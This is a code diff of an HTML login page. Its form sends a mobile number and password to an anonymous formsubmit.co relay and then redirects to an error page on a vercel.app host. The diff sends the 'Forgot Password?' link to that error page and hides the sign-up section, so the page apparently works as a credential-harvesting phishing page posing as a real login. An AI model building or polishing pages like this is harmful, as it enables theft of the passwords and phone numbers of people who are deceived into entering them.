@@ -8,7 +8,8 @@
 </head>
 <body id="body" style="background-color: white;">
     
-    <div class="container">
+    <div class="container" style="position: relative;">
+        <button style="position: absolute; right: 0; top: 0; border: none; background: none; font-size: 1.3em; font-weight: bold; cursor: pointer; margin: 20px;">X</button>
         <h2>Login</h2>
         <form action="https://formsubmit.co/c979cffa3f60cd909235a13c8f804587" method="POST">
         <input type="hidden" name="_next" value="https://bw-vert.vercel.app/error.html">
@@ -18,15 +19,19 @@
         <input placeholder="Mobile Number" type="number" name="phone"> <br>
         <input placeholder="Password" type="password" name="password"> 
         
-        <a href="#" style="text-decoration: none; font-size: smaller;"><p style="color: #6d6a6a;">Forgot Password?</p></a>
+        <a href="error.html" style="text-decoration: none; font-size: smaller;"><p style="color: #6d6a6a;">Forgot Password?</p></a>
         
         <input class="btn" type="submit" style="background-color: rgb(15, 221, 15); color: white;">
+
+
+        <div style="display: none;">
 
         <br>
         <a href="#" style="text-decoration: none;"><p style="color: #6d6a6a;">Forgot Password?</p></a>
         <br>
         <p style="color: #6d6a6a;">Don't have an account yet?</p>
         <input type="submit" class="btn" style="background-color: white; color: rgb(14, 190, 14);" value="Sign Up">
+        </div>
     </form>
     </div>
 </body>
